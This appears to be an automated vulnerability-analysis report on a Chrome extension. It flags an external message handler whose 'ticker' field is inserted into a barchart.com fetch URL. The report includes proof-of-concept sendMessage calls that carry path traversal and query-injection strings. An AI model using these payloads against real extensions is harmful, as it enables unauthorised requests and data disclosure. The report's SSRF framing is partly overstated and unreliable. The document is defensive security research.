# CoCo Analysis: ciohaldbofmccamklddgdejohnaaihhp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ciohaldbofmccamklddgdejohnaaihhp/opgen_generated_files/bg.js
Line 969 - fetch('https://www.barchart.com/stocks/quotes/'+request.ticker+'/cheat-sheet')

**Code:**

```javascript
// Background script (bg.js)
// Line 965-981: External message handler with attacker-controlled URL path
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        if(request.query=='fetch') {
            console.log('fetch');
            fetch('https://www.barchart.com/stocks/quotes/'+request.ticker+'/cheat-sheet')  // ← attacker-controlled 'ticker' in URL path
                .then(response => response.text())
                .then(responseHtml => {
                    let html=document.createElement('html');

                    html.innerHTML=responseHtml;
                    result=html.querySelector('cheat-sheet').getAttribute('data-cheat-sheet-data')
                    sendResponse(JSON.parse(result))  // Sends fetched data back to attacker
                })
        }
        return true;
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage on *.tinkoff.ru domain (whitelisted in externally_connectable)
// Attacker can manipulate the 'ticker' parameter to craft arbitrary URL paths

// Example 1: Path traversal / URL manipulation
chrome.runtime.sendMessage('ciohaldbofmccamklddgdejohnaaihhp', {
    query: 'fetch',
    ticker: '../../api/internal/sensitive-endpoint?param'
}, function(response) {
    console.log('Received:', response);
});

// Example 2: Inject path segments
chrome.runtime.sendMessage('ciohaldbofmccamklddgdejohnaaihhp', {
    query: 'fetch',
    ticker: 'AAPL/../../admin/users'
}, function(response) {
    console.log('Admin data:', response);
});

// Example 3: Query parameter injection
chrome.runtime.sendMessage('ciohaldbofmccamklddgdejohnaaihhp', {
    query: 'fetch',
    ticker: 'AAPL?inject=malicious&x'
}, function(response) {
    console.log('Response:', response);
});
```

**Impact:** Server-Side Request Forgery (SSRF). An attacker on any *.tinkoff.ru domain can manipulate the 'ticker' parameter to:
1. Make privileged cross-origin requests to arbitrary paths on barchart.com
2. Potentially access internal/admin endpoints via path traversal
3. Inject query parameters to modify request behavior
4. Retrieve the response data via sendResponse, enabling information disclosure
5. Bypass CORS restrictions as the fetch is made from the extension's privileged context

The extension performs cross-origin fetch with credentials from the extension context and returns the result to the attacker, allowing them to access endpoints they normally couldn't reach directly from their webpage.
